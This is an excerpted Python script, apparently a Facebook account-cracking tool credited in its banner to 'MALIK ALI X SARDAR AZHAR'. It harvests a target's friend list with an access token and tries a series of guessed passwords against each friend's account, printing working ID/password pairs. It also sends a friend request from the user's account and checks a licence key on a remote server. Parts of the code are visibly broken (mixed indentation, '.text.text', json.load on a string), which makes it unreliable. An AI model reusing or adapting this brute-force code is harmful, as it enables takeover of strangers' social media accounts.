...
\033[1;92m╚═╝░░░░░╚═╝╚═╝░░╚═╝╚══════╝╚═╝╚═╝░░╚═╝
-----------------------------------------------
  AUTHER   :::     MALIK ALI X SARDAR AZHAR
 FACEBOOK  :::     MALIK ALI
 OWNER     :::     RDG OWNER
    KING OF FACEBOOK MALIK ALI X SARDAR AZHAR
-----------------------------------------------"""
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
...
def reg():
    ...
    r = requests.get('https://raw.githubusercontent.com/MalikAli402/Malik/main/server.txt').text
    if to in r:
        ...
        os.system('xdg-open https://www.facebook.com/M4LLK.ALI.YOUR.OFFIC4L.P4P4.90')
        reg()
	...
	try:
		...
		if 'save-device' in url:
			try:
				...
				requests.post('https://free.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
...
def menu():
	...
	try:
		...
		methodlogin()
	try:
		otw = requests.get('https://free.facebook.com/me?access_token='+toket)
...
def pilih_super():
	...
	if peak =="":
		...
		try:
			r = requests.get('https://free.facebook.com/' + idt + '?access_token='+toket)
                        q = json.loads(r.text)
                        z = q['name']
			os.system('clear')
                        print logo
		...
		r = requests.get("https://free.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
		    uid = i['id']
                    na = i['name']
	...
	def main(arg):
		...
		try:
			...
			if 'access_token' in q:
				print '\033[1;92m[AZHAR-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
				oks.append(uid+pass1)
			else:
				if 'free.facebook.com' in q["error_msg"]:
					...
					data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = header).text
		                        q = json.load(data)
					if 'access_token' in q:
						print '\033[1;92m[AZHAR-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'	
						...
						if 'free.facebook.com' in q["error_msg"]:
							...
							data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers = header).text
		                                        q = json.load(data)
							if 'access_token' in q:
								print '\033[1;92m[AZHAR-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
								...
								if 'free.facebook.com' in q["error_msg"]:
									...
									data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers = header).text
		                                                        q = json.load(data)
									if 'access_token' in q:
										print '\033[1;92m[AZHAR-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'	
										...
										if 'free.facebook.com' in q["error_msg"]:
											...
											data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers = header).text
		                                                                        q = json.load(data)
											if 'access_token' in q:
												print '\033[1;92m[AZHAR-OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
												...
												if 'free.facebook.com' in q["error_msg"]:
													...
													data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers = header).text
		                                                                                        q = json.load(data)
													if 'access_token' in q:
														print '\033[1;92m[AZHAR-OK] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
														...
														if 'free.facebook.com' in q["error_msg"]:
															...
															data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers = header).text.text
		                                                                                                        q = json.load(data)
															if 'access_token' in q:
																print '\033[1;92m[AZHAR-OK] \x1b[1;32m' + uid + ' | ' + pass7 + '\x1b[0;97m'
